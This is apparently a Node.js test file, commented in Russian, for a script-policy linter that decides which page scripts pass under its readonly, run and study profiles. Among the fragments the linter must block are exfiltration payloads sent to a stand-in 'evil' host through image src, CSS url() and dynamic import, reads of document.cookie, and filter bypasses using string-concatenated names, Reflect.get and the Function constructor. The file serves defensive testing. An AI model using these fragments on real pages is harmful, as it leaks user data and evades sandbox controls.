'use strict';
/* Тесты линтера skript-policy.js: минимум30 фрагментов, три профиля.
 * Запуск: node skript-lint.test.js — без внешних зависимостей. */

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const ctx = { console };
vm.createContext(ctx);
vm.runInContext(fs.readFileSync(path.join(__dirname, 'skript-policy.js'), 'utf8'), ctx, { filename: 'skript-policy.js' });
const SkriptPolicy = vm.runInContext('SkriptPolicy', ctx);
const lint = (code, profile) => SkriptPolicy.lint(code, profile);

let n =0;
const ok = (code, profile) => { n++; const r = lint(code, profile); assert.ok(r.ok, `[${profile}] «${code}» должен проходить, получено: ${r.error}`); };
const bad = (code, profile) => { n++; const r = lint(code, profile); assert.ok(!r.ok, `[${profile}] «${code}» должен блокироваться`); };

// --- Должны проходить (и readonly, и run): ложные срабатывания старого линтера ---
for (const p of ['readonly', 'run']) {
 ok('a == b', p);
 ok('a != b', p);
 ok('a === b', p);
 ok('rect.top +1', p);
 ok('el.style.top', p);
 ok('window.innerWidth >0', p);
 ok('document.title.length', p);
 ok('getBoundingClientRect().width', p);
}

// --- Должны блокироваться в readonly ---
bad('x =1', 'readonly');
bad('obj.prop =2', 'readonly');
bad('counter++', 'readonly');
bad('delete obj.key', 'readonly');
bad('fetch("/x")', 'readonly');
bad('localStorage.getItem("a")', 'readonly');
bad('sessionStorage.clear()', 'readonly');
bad('eval("1+1")', 'readonly');
bad('new Function("return1")', 'readonly');
bad('await p', 'readonly');
bad('setTimeout(f,10)', 'readonly');
bad('el.appendChild(node)', 'readonly');
bad('location = "https://x"', 'readonly');
bad('el.click()', 'readonly');

// --- Должны блокироваться в run ---
// Локальные присваивания, ++/--, собственные объекты и массивы — разрешены.
ok('x =1', 'run');
ok('state.score =10', 'run');
ok('delete obj.key', 'run');
// Типовые контроллеры (2048 и динозаврик) должны проходить целиком.
ok(`let score =0;
const board = [];
for (let i =0; i <16; i++) board[i] =0;
score++;
const grid = document.querySelector('.grid');
const cells = [...grid.children];
cells.forEach((c, i) => { c.dataset.v = board[i]; });
score = score +2;
return { score, board };`, 'run');
ok(`let speed =6;
let jumped = false;
const dino = document.querySelector('#runner');
function step(t) {
 speed = speed +0.001;
 jumped = !jumped;
 dino.style.bottom = jumped ? '40px' : '0px';
}
step(16);
delete dino.dataset.old;
return { speed };`, 'run');
// Глобальные объекты, прототипы, cookie — под запретом в run.
bad('window.x =1', 'run');
bad('globalThis.game = g', 'run');
bad('self.best =10', 'run');
bad('top.location.hash = "#x"', 'run');
bad('document.cookie = "a=1"', 'run');
bad('document.title = "x"', 'run');
bad('localStorage.token = "t"', 'run');
bad('history.scrollRestoration = "manual"', 'run');
bad('Array.prototype.map = myMap', 'run');
bad('String.prototype.trim = f', 'run');
bad('Element.prototype.click = f', 'run');
bad('obj.__proto__ = base', 'run');
bad('delete window.game', 'run');
bad('delete localStorage.foo', 'run');
bad('delete Array.prototype.map', 'run');
bad('Object.defineProperty(window, "x", {})', 'run');
bad('Object.setPrototypeOf(obj, base)', 'run');
bad('window.score +=1', 'run');
bad('fetch("/api")', 'run');
bad('localStorage.setItem("a",1)', 'run');
bad('eval("code")', 'run');
bad('new Function("return2")', 'run');
bad('XMLHttpRequest', 'run');
bad('WebSocket("wss://x")', 'run');
bad('document.cookie', 'run');
bad('setTimeout(step,100)', 'run');
bad('location.href = "/next"', 'run');
bad('chrome.runtime.sendMessage({})', 'run');
bad('indexedDB.open("db")', 'run');
bad('navigator.sendBeacon("/x")', 'run');

// Навигация — только через location. Живой прогон 2048: str.replace() и Object.assign() отклонялись как «метод навигации».
ok("const v = Number(t.className.replace(/\\D+/g, '')); v", 'run');
ok("const s = Object.assign({}, a); s", 'run');
ok("const tiles = [...document.querySelectorAll('.tile')].map((t) => t.className.replace('tile-', '')); tiles", 'run');
ok("const p = location.pathname; p", 'run');
ok("location.href.includes('2048')", 'readonly');
ok("String(x).replace('a', 'b')", 'readonly');
bad('location.reload()', 'run');
bad('location.replace("/x")', 'run');
bad('window.location.assign("/x")', 'run');
bad('document.location.replace("/x")', 'run');
bad('const l = location; l.reload()', 'run');
bad('a.href = "/x"', 'run');
{
  const r = lint("const keys = ['ArrowLeft'];\nfunction f() { return 1; }\nlocation.reload();", 'run');
  assert.ok(/location\.reload/.test(r.error), 'в отказе показан фрагмент с нарушением, а не начало кода: ' + r.error);
}

// --- Профиль study: побочные эффекты можно, сеть/хранилища нельзя ---
ok('el.style.top = "10px"', 'study');
ok('x =1', 'study');
bad('fetch("/x")', 'study');
bad('localStorage.setItem("a",1)', 'study');

// --- Литералы и комментарии не ломают разбор ---
ok('const s = "fetch(x)"; s.length', 'readonly'); // fetch внутри строки
ok('a ==1 // comment with eval(', 'readonly'); // eval в комментарии
ok('`localStorage`.length', 'readonly'); // шаблонный литерал
bad('const u = "x"; fetch(u)', 'run');

// --- Обходы по имени (этап 1 v3) ---
for (const pr of ['readonly', 'study', 'run']) {
  bad('window["fetch"]("//x")', pr);
  bad('globalThis["fe"+"tch"](1)', pr);
  bad('(()=>{}).constructor("return fetch")()()', pr);
  bad('handlers[name](1)', pr);
  ok('arr.map((x) => x * 2).length', pr);
  ok('const t = rect.top + 1; t', pr);
}

// --- Обходы через шаблоны, регулярки, ссылки и DOM (загрузка внешнего ресурса уносит данные страницы) ---
for (const pr of ['readonly', 'study', 'run']) {
  bad('const x = `${fetch("https://evil")}`', pr);
  bad('const x = `a${`b${fetch(u)}`}`', pr);
  bad("const re = /[\"']/; fetch('/x')", pr);
  bad('const f = fetch; f("x")', pr);
  bad('const f = this["fe" + "tch"]', pr);
  bad('function g() { return this } g().fetch', pr);
  bad('const w = globalThis; w.alert(1)', pr);
  bad('Reflect.get(globalThis, "fetch")("x")', pr);
  bad('import("https://evil/x.js")', pr);
  bad('new Image().src = "https://evil/?d=" + document.title', pr);
  bad('const i = document.createElement("img"); i.src = u', pr);
  bad('el.innerHTML = "<img src=https://evil/>"', pr);
  bad('el.insertAdjacentHTML("beforeend", s)', pr);
  bad('el.setAttribute("src", u)', pr);
  bad('el.style.background = "url(https://evil/?d=" + d + ")"', pr);
  bad('window.open(u)', pr);
  bad('document.body.append(Object.assign(document.createElement("img"), { src: u }))', pr);
  ok('const st = Object.assign({}, prev, { score: 1 }); st', pr);
  // ложные срабатывания: деление, регулярки и строки с «fetch», свои поля объектов
  ok('const k = a / b / 2; k', pr);
  ok('const n = (w / 4) | 0; n', pr);
  ok('const m = "fetch me".match(/fetch/g); m', pr);
  ok('const fetchCount = 1; fetchCount', pr);
  ok('const t = `cell ${i + 1}/${n}`; t', pr);
  ok('const d = el.dataset.value; d', pr);
}
ok('el.textContent = "Ход " + n', 'study');
ok('el.textContent = "Ход " + n', 'run');
ok('el.style.top = "10px"; el.style.left = x + "px"', 'run');
ok('node.parent = wrap; move.action = "left"', 'run');
bad('top = 1', 'run');
bad('opener = null', 'run');
bad('window.top.location = u', 'run');

assert.ok(n >=30, `фрагментов должно быть не меньше30, сейчас ${n}`);
console.log(`skript-lint.test.js: OK (${n} фрагментов)`);